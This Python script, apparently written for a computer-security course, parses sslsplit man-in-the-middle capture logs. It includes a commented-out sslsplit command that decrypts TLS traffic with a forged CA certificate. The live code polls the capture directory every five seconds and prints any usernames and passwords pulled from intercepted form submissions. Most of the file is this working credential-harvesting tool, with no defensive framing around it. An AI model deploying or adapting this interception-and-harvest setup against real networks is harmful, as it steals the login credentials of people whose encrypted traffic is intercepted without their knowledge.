# import netifaces
# from netaddr import IPAddress
# import math

# # interfaces = netifaces.ifaddresses('wlp3s0')
# # # dictionary
# # normal_internet = interfaces[netifaces.AF_INET][0]
# # address = normal_internet['addr']
# # netmask = normal_internet['netmask']
# # broadcast = normal_internet['broadcast']
# # slash = IPAddress(netmask).netmask_bits()

# # print(address + ' ' + netmask + ' ' + broadcast + ' ' + str(slash))
# # netmask = "255.255.255.0"
# # temp = netmask.rsplit('.')
# # print(temp)
# # number = 0
# # for i in range(4):
# #     number = number << 8
# #     number += int(temp[i])
# #     # number = number << (8*i)
# #     print(number)
# # slash = 0
# # for i in range(32):
# #     print(number)
# #     if number % 2 == 1:
# #         slash = i
# #         break
# #     number = number >> 1
# # print( slash)

# # sslsplit -D -l /home/cs2021/computer_security/sslsplit/connections.log -j /home/cs2021/computer_security/sslsplit/ -S /home/cs2021/computer_security/sslsplit/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
from os import listdir
from os.path import isfile, join
import os
import sys
import time

# def get_information(filename):
#     # parse log
#     line = ""
#     log = open(filename, 'rb')
#     byte = 1

#     # for i in range(100):
#     while byte:
#         line = ""
#         while 1:
#             byte = log.read(1)
#             if not byte:
#                 log.close()
#                 break
#             # byte = str(byte)[2]
#             line = line + str(byte)[2]
#             if byte == b'\n':
#                 # print("next line")
#                 break
#         line = line[:len(line)-2]
#         username = line.find('username=')
#         if username != -1:
#             try:
#                 # print(line)
#                 # find start with find username
#                 # erase username&
#                 line = line[username + 9:]
#                 first_and_mark = line.find('&')
#                 username = line[:first_and_mark]

#                 # erase  &password=
#                 line = line[first_and_mark+10:]
#                 first_and_mark = line.find('&')
#                 password = line[:first_and_mark]
#                 print(username)
#                 print(password)
#             except:
#                 pass

#     # line = line[:len(line)-1]
#     # print(line)
#     # log.close()

# # search file in dir
# pathname = os.path.realpath(__file__)
# last = pathname.rfind('/')
# mypath = pathname[:last]


# command =   'sslsplit -D -l ' + mypath + '/sslsplit/connections.log'\
#             ' -j ' + mypath + '/sslsplit/'\
#             ' -S ' + mypath + '/sslsplit/logdir/'\
#             ' -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080'
# print(command)



# onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
# print(onlyfiles)
# # used set() to record
# already_search = set()
# already_search.add("test.py")
# for i in onlyfiles:
#     if i not in already_search:
#         already_search.add(i)
#         get_information(i)

# # # parse log
# # line = ""
# # log = open('20210421T163359Z-192.168.99.215,48708-140.113.41.24,443.log', 'rb')
# # byte = 1

# # # for i in range(100):
# # while byte:
# #     line = ""
# #     while 1:
# #         byte = log.read(1)
# #         if not byte:
# #             # print("end")
# #             break
# #         # byte = str(byte)[2]
# #         line = line + str(byte)[2]
# #         if byte == b'\n':
# #             # print("next line")
# #             break
# #     line = line[:len(line)-2]
# #     username = line.find('username=')
# #     if username != -1:
# #         print(line)
# #         # find start with find username
# #         # erase username&
# #         line = line[username + 9:]
# #         first_and_mark = line.find('&')
# #         username = line[:first_and_mark]
# #         print(username)

# #         # erase  &password=
# #         line = line[first_and_mark+10:]
# #         first_and_mark = line.find('&')
# #         password = line[:first_and_mark]
# #         print(password)

# # # line = line[:len(line)-1]
# # # print(line)
# # # log.close()

def get_information(filename):
    # parse log
    line = ""
    log = open(filename, 'rb')
    byte = 1

    # for i in range(100):
    while byte:
        line = ""
        while 1:
            byte = log.read(1)
            if not byte:
                log.close()
                break
            # byte = str(byte)[2]
            line = line + str(byte)[2]
            if byte == b'\n':
                # print("next line")
                break
        line = line[:len(line)-2]
        # print(line)
        username = line.find('username=')
        if username != -1:
            print("find username")
            try:
                # print(line)
                # find start with find username
                # erase username&
                line = line[username + 9:]
                first_and_mark = line.find('&')
                username = line[:first_and_mark]

                # erase  &password=
                line = line[first_and_mark+10:]
                first_and_mark = line.find('&')
                password = line[:first_and_mark]
                print("Username: ",username)
                print("Password ",password)
            except:
                pass

def sslSplit():
    # x = 0
    # while x < 5:
    #     os.system("date")
    #     x = x + 1
    #     time.sleep(2)
    # print("[-] sslSplit stopped")
    
    # obtain file path
    pathname = os.path.realpath(__file__)
    last = pathname.rfind('/')
    mypath = pathname[:last]
    # run sslsplit
    # command =   'sslsplit -D -l ' + mypath + '/sslsplit/connections.log'\
    #         ' -j ' + mypath + '/sslsplit/'\
    #         ' -S ' + mypath + '/sslsplit/logdir/'\
    #         ' -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080'
    # os.system(command)
    # while loop keep search username and password
    logpath = mypath + "/sslsplit/logdir/"
    # used set() to record
    already_search = set()
    while 1:
        onlyfiles = [f for f in listdir(logpath) if isfile(join(logpath, f))]
        print(onlyfiles)
        for i in onlyfiles:
            if i not in already_search:
                print("find")
                already_search.add(i)
                # filename + logpath
                get_information(logpath + i)
        time.sleep(5)

sslSplit()